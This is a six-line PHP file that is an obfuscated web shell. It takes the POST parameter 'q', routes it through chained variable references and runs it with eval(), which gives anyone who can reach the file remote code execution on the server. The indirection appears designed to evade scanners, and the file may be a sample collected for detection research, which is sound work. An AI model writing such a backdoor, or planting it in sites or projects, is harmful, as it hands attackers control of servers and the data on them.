<?php
$b = &$a;
$a = $_POST['q'];
$c=  &$b;
eval(`/*123*/`.''.$c);
?>